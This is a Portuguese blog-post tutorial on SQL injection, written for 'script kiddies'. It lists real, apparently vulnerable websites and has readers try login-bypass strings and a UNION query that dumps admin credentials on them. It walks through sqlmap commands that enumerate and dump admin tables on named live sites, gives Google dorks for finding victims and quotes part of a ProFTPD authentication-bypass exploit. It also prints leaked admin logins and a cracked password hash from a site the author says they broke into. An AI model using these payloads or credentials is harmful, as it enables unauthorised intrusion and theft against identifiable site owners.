---
layout: post
title: "SQL for script kiddies"
---

Primeiramente, porque "injeção de SQL"?

Na maioria das vezes quando se tem uma aplicação (seja desktop, mobile ou Web) interagindo com um banco de dados, o usuário não precisa em nenhum momento se preocupar em COMO essa aplicação está lidando com o banco (e nem precisa saber que há um banco de dados ali). A ideia de se "injetar SQL" é o ato de fornecer fragmentos (ou até mesmo QUERYs completas) de código SQL na aplicação vulnerável, de modo com que uma autenticação ou uma simples consulta ao banco seja maliciosamente modificada;

SQL Injection não é falha no SGBD, mas sim na APLICAÇÃO que se utiliza do SGDB;


A forma como o código SQL será escrito no processo de injeção vai depender do SGBD utilizado pelo sistema-vítima. Ex: MySQL Injection, PostgresSQL Injection, MSSQLi... ;

Basicamente, um ataque de SQL Injection em um sistema WEB pode ser realizado de duas maneiras diferentes:

- SQLi Básico: no formulário de login é injetado uma string SQL com o objetivo de burlar a autenticação. Exemplo de site vulnerável da Tailândia:

http://www.kdy.ac.th/admin/login.php
     
Experimente:

```
Login: 'or'1--
Senha: 'or'1--
```

Você vai perceber que conseguiu se logar apenas fornecendo esses fragmentos de código SQL como login e senha.

Exemplos de outros sites:

- http://www.senate.go.th/senate/admin/ (Este inclusive já foi hackeado)
- http://www.prism.co.th/pscc/Back-admin/login.php
- http://www.pisini.it/soft/admin/login.php (Site da Itália)
- http://ilgroglio.it/admin/

- SQLi Avançado: nesse caso, a injeção acontecerá diretamente na URL do site por requisição GET (em situações mais convencionais, mas existe também a possibilidade de se atacar por meio de POST - porque não?). O diferencial deste ataque com relação ao anterior é que você irá interagir com o banco de dados até conseguir o login e a senha armazenado nele.

Exemplo, olha esse site da Tailândia: http://www.thailandquitline.or.th/news.php?id=58

Legal né?

Só por curiosidade, experimente incrementar o valor passado para a variável id:

- http://www.thailandquitline.or.th/news.php?id=59
- http://www.thailandquitline.or.th/news.php?id=60

Esses valores são identificadores de dados armazenados no banco. De certa forma, quando você manipula esses valores você está interagindo com o banco de dados do site, uma vez que, a cada valor diferente de ID que você definir gerará uma consulta SELECT diferente pelo arquivo news.php.

Se você acrescentar uma aspa simples junto ao id, você poderá ver uma mensagem de erro retornada:

http://www.thailandquitline.or.th/news.php?id=60'

Isso aconteceu porque a consulta feita pelo news.php para o banco de dados foi 'corrompida'. Uma vez que o número passado para a variável id continha um código SQL (o aspa ' ). Isso é um bom sinal. Indo mais além olhe isto, jovem:

```
http://www.thailandquitline.or.th/news.php?id=-58 union all select concat(username,0x3a,password),2,3,4 from admin--
```

Copie tudo que está na linha a cima e cole no seu navegador.

```
Login: admin
Senha: systemadmin
```

Ciente de que existe um padrão na exploração de SQL injection (detecção do SGBD usado, enumeração de tabelas, busca por campos de tabela de usuarios para extração de login e senha e etc), alguns especialistas no assunto desenvolveram ferramentas que automatizam isto, como é o caso do Havij e do SQLMAP:

http://itsecteam.com/products/havij-advanced-sql-injection/
http://sqlmap.org/

Uma coisa que você tinha me perguntado: como encontrar sites vulneráveis á SQLi ?

A resposta: GOOGLE

Os sites que postei aqui nesse email foram encontrados por ele. Eu me utilizei de recursos avançados do Google para pesquisas mais específicas.

Help: https://support.google.com/websearch/answer/2466433?hl=pt-BR

Pesquisas específicas utilizando de operadores avançados de pesquisa do Google são comumente chamados de "dorks", exemplo de como encontrei os sites vulneráveis da Itália:

```
inurl:/admin/admin.php +site:it
```

Outro exemplo: eu pesquiso por sites que contenham alguma URL com news.php?id=
e que tenha seu domínio .th (Tailândia):

```
inurl:news.php?id= +site:th
```

Ao contrário do que se pensam, SQL Injection não se limita apenas a sistemas WEB, vide o caso desta vulnerabilidade:

http://www.securityfocus.com/bid/33722/exploit

No caso desta falha, que seria interessante ser citada na apresentação, um serviço de FTP chamado "Proftpd" possui um módulo que permite autenticação do serviço de FTP com usuários cadastrados em um banco de dados MySQL. O interessante é que este módulo não fazia validação dos dados de entrada, permitindo que um atacante pudesse injetar strings SQL como nome de usuário, assim:

```
username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
password: 1
```

E com isso ele conseguia rodar comandos no FTP server sem conhecer nenhum login nem senha.

Olha esse vídeo nos 4:20 demonstrando a utilização de um exploit que explora essa falha:

https://www.youtube.com/watch?v=s5EtYRiMf_o


Em uma simples análise do exploit utilizado no vídeo:

http://downloads.securityfocus.com/vulnerabilities/exploits/33722.pl

É possível perceber a simplicidade da exploração da falha:

```
$host = $ARGV[0]; # Variável $host recebe o endereço IP do servidor á ser atacado

# Variável $user é inicializada com pedaço de código SQL que deverá 'confundir'
# processo de autenticação no lado do servidor:
$user = "USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --"; 
$pass = '1';

# Variável $ftp armazena descritor de conexão estabelecida com servidor FTP
$ftp = Net::FTP->new("$host", Debug => 0) or die "[!] Cannot connect to $host";

# O login malicioso é realizado, perceba que nome de usuário é simplesmente
# o conteúdo de $user
$ftp->login("$user","$pass") or die "\n\n[!] Couldn't ByPass The authentication ! ", $ftp->message;
print "\n[*] Connected To $host";
```

Baixando e executando o SQLMap:

Link para Download: https://codeload.github.com/sqlmapproject/sqlmap/legacy.tar.gz/master

Você fará o download de um arquivo com esse nome: sqlmapproject-sqlmap-0.9-4059-ge35c7fb.tar.gz


Descompactando:

```
$ tar -zxvf sqlmapproject-sqlmap-0.9-4059-ge35c7fb.tar.gz
```

Entrando no diretório gerado após a descompactação:

```
cd sqlmapproject-sqlmap-e35c7fb
```

Executando o SQLmap:

```
python sqlmap.py
```

Ele vai te retorna isso:

```
Usage: python sqlmap.py [options]
```

Vendo o help dele:

```
$ python sqlmap.py -h
```

Para verificar se um site está vulnerável, você poderá usar o parâmetro -u (de URL):

```
python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1
```

Ele vai realizar uma série de testes. Antes de começar cada teste ele vai te perguntar se você quer ou não que ele faça, siga fazendo as sugestões dele. [Y/n] para Sim, [y/N] para não.

Como já sabemos muito bem que esse site está vulnerável, não precisamos disso.

Vamos agora determinar qual é o nome da database usada pelo site:

```
$ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 --current-db -v 0
```

- Obs: O parâmetro -v 0 é legal para diminuir a "verbosidade" do sqlmap. Polui menos o shell.
- Obs2: Com a opção --current-db o sqlmap nos retornará o esperado nome da database. Isso é importante para o próximo passo, onde uma vez de posse do nome do banco, o sqlmap vai conseguir fazer as consultas ao SGDB de forma mais apropriada.


Ele vai te retornar algo como isto:

```
     web application technology: Apache 2, PHP 5.2.17
     back-end DBMS: MySQL 5.0.11
     current database:    'admin_nd'
```

Vamos agora enumerar as tabelas do banco admin_nd:

```
$ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 -D admin_nd --tables -v0
```

Obs: Perceba que com -D eu especifico a database, e --tables dizemos ao SQLMap que queremos que ele nos mostre as tabelas contidas na database admin_nd;

Ele vai nos retornar algo como isto:

```
     web application technology: Apache 2, PHP 5.2.17
     back-end DBMS: MySQL 5.0.11
     Database: admin_nd
     [20 tables]
     +--------------------------+
     | admin              
     | admin_module  
     | callback_patientschronic
     | callback_recipients     
     | captcha
     | contact
     | contact_data
     | customer     
     | email           
     | news           
     | refer            
     | result_patientschronic
     | result_recipients      
     | u_refer_case     
     | u_refer_follow    
     | u_refer_member
     | uquit                
     | uquit_email      
     | urefer_email     
     | vdo                 
     +--------------------------+
```

De ante das tabelas enumeradas, cabe agora observar a tabela que possivelmente armazena
informações de login e senha. Neste caso a mais suspeita é a "admin". Vamos então
visualizar o conteúdo dela:

```
$ python sqlmap.py -u http://www.thailandquitline.or.th/news.php?id=1 -D admin_nd -T admin --dump -v0
```

Obs: -D admin_nd -T admin, define que queremos trabalhar com a tabela admin da database admin_nd.
Obs2: com --dump pedidos para o sqlmap nos mostrar o conteúdo desta tabela.

Resultado:

```
web application technology: Apache 2, PHP 5.2.17
back-end DBMS: MySQL 5.0.11
Database: admin_nd
Table: admin
[1 entry]
+------+------------------+---------------------+----------------+
| root | username  | lastname      | password    | firstname     |
+-------+-----------------+---------------------+----------------+
| 1    | admin     | Administrator | systemadmin | Administrator |
+-------+------------------+---------------------+---------------+
```

Experimente fazer esses procedimentos com esses sites:

http://camping-boomerang.ch/en/news.php?ID=91
http://www.audio-prestige.ch/news/news.php?id=100
http://www.mediations.ch/cms/news.php?id=10


Consegui invadir esse site: http://www.stonetouch.ch/

```
$ python sqlmap.py -u http://www.stonetouch.ch/news.php?id=9 -D c_bohnet_stonetouch-english -T wk_admin_user --dump -v0
```

Página de login: http://www.stonetouch.ch/admin/privilege.php?act=login

```
Login: admin
Hash da senha em MD5: 0192023a7bbd73250516f069df18b500
Hash quebrado: admin123
```

EOF
